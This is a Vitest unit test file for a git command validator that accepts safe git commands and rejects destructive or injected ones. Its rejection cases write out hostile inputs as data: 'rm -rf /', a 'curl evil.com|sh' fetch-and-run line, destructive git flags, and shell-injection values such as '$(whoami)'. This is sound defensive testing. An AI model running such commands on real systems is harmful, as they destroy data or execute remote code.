import { describe, it, expect } from 'vitest';
import { isValidGitCommand } from '../../../../src/services/git/git-command-validator';

describe('isValidGitCommand', () => {
  it('accepts safe git commands', () => {
    expect(isValidGitCommand(['git', 'add', '-A']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'commit', '-m', 'msg']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'pull', '--rebase']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'push', '--force-with-lease']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'fetch', '--all', '--prune']).safe).toBe(true);
  });

  it('accepts --force-with-lease with explicit refspec', () => {
    expect(isValidGitCommand(['git', 'push', '--force-with-lease=feature:abc123']).safe).toBe(true);
  });

  it('rejects non-git commands', () => {
    expect(isValidGitCommand(['rm', '-rf', '/']).safe).toBe(false);
    expect(isValidGitCommand(['curl', 'evil.com|sh']).safe).toBe(false);
    expect(isValidGitCommand(['bash', '-c', 'evil']).safe).toBe(false);
  });

  it('rejects empty or degenerate command', () => {
    expect(isValidGitCommand([]).safe).toBe(false);
    expect(isValidGitCommand(['git']).safe).toBe(false);
  });

  it('rejects git with disallowed subcommand', () => {
    expect(isValidGitCommand(['git', 'filter-branch', '--all']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'update-ref', '-d', 'HEAD']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'fast-import']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'fast-export']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'replace', '--graft']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'gc', '--prune=now']).safe).toBe(false);
  });

  it('rejects dangerous git subcommand/flag combinations', () => {
    expect(isValidGitCommand(['git', 'push', '--mirror']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'reset', '--hard']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'reset', '--hard', 'HEAD~1']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'clean', '-fd']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'clean', '-fdx']).safe).toBe(false);
  });

  it('rejects dangerous flags', () => {
    expect(isValidGitCommand(['git', 'push', '--force']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'push', '-f']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'branch', '-D', 'main']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'branch', '-d', 'feature']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'tag', '--delete', 'v1']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'tag', '-d', 'v1']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'stash', 'drop']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'push', '--no-verify']).safe).toBe(false);
  });

  it('rejects command injection via shell metachars (defense in depth)', () => {
    expect(isValidGitCommand(['git', 'log', '--format=%x09$(whoami)']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'commit', '-m', '"; rm -rf /']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'commit', '-m', 'msg\x00']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'log', '--format=`id`']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'commit', '-m', 'a|b']).safe).toBe(false);
    expect(isValidGitCommand(['git', 'commit', '-m', 'a&b']).safe).toBe(false);
  });

  it('returns a descriptive reason for rejection', () => {
    const result = isValidGitCommand(['git', 'push', '--force']);
    expect(result.safe).toBe(false);
    expect(result.reason).toBeDefined();
    expect(typeof result.reason).toBe('string');
    expect(result.reason!.length).toBeGreaterThan(0);
  });

  it('reason mentions dangerous flag/subcommand when applicable', () => {
    const r1 = isValidGitCommand(['git', 'push', '--force']);
    expect(r1.reason).toMatch(/--force/);

    const r2 = isValidGitCommand(['git', 'reset', '--hard']);
    expect(r2.reason).toMatch(/--hard/);

    const r3 = isValidGitCommand(['git', 'filter-branch', '--all']);
    expect(r3.reason).toMatch(/filter-branch/);
  });

  it('accepts common rebase control flags only for rebase', () => {
    expect(isValidGitCommand(['git', 'rebase', '--continue']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'rebase', '--abort']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'rebase', '--skip']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'commit', '--abort']).safe).toBe(false);
  });

  it('accepts core healer workflow commands', () => {
    expect(isValidGitCommand(['git', 'add', '-A']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'add', '.']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'rebase', '--continue']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'pull', '--rebase']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'push']).safe).toBe(true);
    expect(isValidGitCommand(['git', 'push', '--force-with-lease']).safe).toBe(true);
  });
});